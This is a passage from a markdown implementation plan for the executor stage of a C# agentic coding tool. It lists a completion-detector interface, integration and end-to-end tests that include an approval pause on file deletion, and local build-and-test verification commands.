- OR LLM indicates task done in reasoning
- OR timeout/turn limit reached

**Suggested Implementation:**
```csharp
namespace AgenticCoder.Application.Orchestration.Stages.Executor;

public interface ICompletionDetector
{
    bool IsComplete(LlmResponse response);
}

public sealed class CompletionDetector : ICompletionDetector
{
    public bool IsComplete(LlmResponse response)
    {
        return response.IsComplete;
    }
}
```

**Success Criteria:**
- [ ] ICompletionDetector.cs created
- [ ] CompletionDetector.cs created
- [ ] IsComplete method checks response.IsComplete
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ICompletionDetector interface and CompletionDetector service

---

## PHASE 6: Integration & Approval Handling (2-3 hours)

### Gap 6.1: Create Integration Tests

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1335-1417 (Integration Tests section)

**What Exists:** Nothing - Integration test files do not exist

**What's Missing:**
- ExecutorIntegrationTests.cs with integration test scenarios
- Tests against real (not mocked) components
- File write testing
- Approval gate testing

**Implementation Details from Spec (lines 1335-1417):**
Complete test code provided including:
- ExecutorIntegrationTests class with TestServerFixture
- Should_Execute_Real_File_Write_Step test
- Should_Pause_For_Approval_On_Delete test
- Helper methods: CreateSingleStepPlan

**Copy directly from spec lines 1335-1417 (82 lines total)**

**Acceptance Criteria Covered:**
- AC-035: Write works (test creates actual file)
- AC-044: Policy checked (approval required for delete)
- AC-047: Pause works (execution pauses for approval)

**Test Requirements:**
- 2 integration test methods (exact code from spec)

**Success Criteria:**
- [ ] ExecutorIntegrationTests.cs created at tests/Acode.Application.Tests/Orchestration/Stages/Executor/ExecutorIntegrationTests.cs
- [ ] Uses TestServerFixture for test server setup
- [ ] Should_Execute_Real_File_Write_Step test implemented
- [ ] Should_Pause_For_Approval_On_Delete test implemented
- [ ] Both tests passing (2/2)
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ExecutorIntegrationTests.cs with 2 test methods from spec lines 1335-1417
- [ ] ✅ Verify integration tests passing

---

### Gap 6.2: Create E2E Tests

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1420-1483 (E2E Tests section)

**What Exists:** Nothing - E2E test files do not exist

**What's Missing:**
- ExecutorE2ETests.cs with end-to-end test scenario
- Tests multi-step task execution
- Uses E2ETestFixture
- Validates all steps complete successfully

**Implementation Details from Spec (lines 1420-1483):**
Complete test code provided including:
- ExecutorE2ETests class with E2ETestFixture
- Should_Complete_Multi_Step_Task_End_To_End test
- Creates 3-step plan (create file, write content, read back)
- Helper method: Create3StepPlan

**Copy directly from spec lines 1420-1483 (63 lines total)**

**Acceptance Criteria Covered:**
- AC-003: Execute processes steps (all 3 steps executed)
- AC-006: Dependency order works (steps in order)
- AC-034: Read works (step 3 reads file)
- AC-035: Write works (step 2 writes file)

**Test Requirements:**
- 1 E2E test method (exact code from spec)

**Success Criteria:**
- [ ] ExecutorE2ETests.cs created at tests/Acode.Application.Tests/E2E/Orchestration/Stages/Executor/ExecutorE2ETests.cs
- [ ] Uses E2ETestFixture for test environment
- [ ] Should_Complete_Multi_Step_Task_End_To_End test implemented
- [ ] Test passing (1/1)
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ExecutorE2ETests.cs with 1 test method from spec lines 1420-1483
- [ ] ✅ Verify E2E tests passing

---

## PHASE 7: Final Verification & Completion (1-2 hours)

### Gap 7.1: Verify All Files Created & Tests Passing

**Current State:** Testing phase

**What Needs Verification:**
- All 10 production files created
- All 5 test files created
- All tests passing (10+ test methods)
- Build clean (0 errors, 0 warnings)
- No NotImplementedException remaining

**Verification Steps:**

1. **Count Production Files:**
```bash
find src/Acode.Application -path "*/Executor/*" -name "*.cs" | wc -l  # Should be 7
find src/Acode.Application/Tools -name "*.cs" | wc -l  # Should be 3 (ITool, ToolDefinition, ToolRegistry)
find src/Acode.Application/Tools/Sandbox -name "*.cs" | wc -l  # Should be 2
```

2. **Count Test Files:**
```bash
find tests -path "*Executor*" -name "*Tests.cs" | wc -l  # Should be 5
find tests -path "*Sandbox*" -name "*Tests.cs" | wc -l  # Should be counted above
```

3. **Scan for NotImplementedException:**
```bash
grep -r "NotImplementedException" src/Acode.Application/Orchestration/Stages/Executor/
grep -r "NotImplementedException" src/Acode.Application/Tools/
# Expected: NO MATCHES
```

4. **Run Tests:**
```bash
dotnet test --filter "FullyQualifiedName~AgenticCoder.Application.Tests.Orchestration.Stages.Executor"
# Expected: All tests passing
dotnet test --filter "FullyQualifiedName~AgenticCoder.Application.Tests.Tools.Sandbox"
# Expected: All tests passing
```

5. **Build Verification:**
```bash
dotnet build
# Expected: 0 errors, 0 warnings
```

**Success Criteria:**
- [ ] All 10 production files exist
- [ ] All 5 test files exist
- [ ] All tests passing (10+ test methods)
- [ ] No NotImplementedException found
- [ ] Build clean (0 errors, 0 warnings)
- [ ] All 64 ACs semantically verified

**Gap Checklist Item:**
- [ ] ✅ Verify all files created
- [ ] ✅ Verify no NotImplementedException
- [ ] ✅ Verify all tests passing
- [ ] ✅ Verify build clean

---

### Gap 7.2: Update Gap Analysis Document

**Current State:** Initial gap analysis shows 0% completion

**What Needs Update:**
- Change completion percentage to 100%
- Update AC-by-AC mapping showing all 64 ACs verified
- Document test results (10+ tests passing)
- Mark all phases complete with evidence

**Update Steps:**
1. Change "Semantic Completeness: 0% (0/64 ACs)" to "100% (64/64 ACs)"
2. Update "Current Implementation State" to show all files ✅ COMPLETE
3. Update "AC-by-AC Mapping" to show "0/64 verified" → "64/64 verified"
4. Update "Build & Test Status" with actual test results
5. Mark all phases complete with evidence

**Success Criteria:**
- [ ] Gap analysis updated to show 100% completion
- [ ] All 64 ACs marked as verified
- [ ] Test results documented (exact counts)
- [ ] Build status confirmed (0 errors, 0 warnings)

**Gap Checklist Item:**
- [ ] ✅ Update gap analysis document to 100%

---

## COMPLETION SUMMARY

**When all phases complete:**
- ✅ All 10 production files created and implemented
- ✅ All 5 test files created with 10+ test methods
- ✅ All 64 Acceptance Criteria verified as implemented
- ✅ All tests passing (100% pass rate)
- ✅ Build clean (0 errors, 0 warnings)
- ✅ Gap analysis updated to 100% completion
- ✅ Ready for PR and merge

**Estimated Total Time:** 18-25 hours (after task-012a IStage interface complete)

**Key Dependencies:**
- ⚠️ Task-012a must provide IStage interface before Phase 3 can begin
- Task-011a (Run Entities) likely needed for StepContext structure
- Task-001 (Modes) provides ApprovalPolicy enum

---
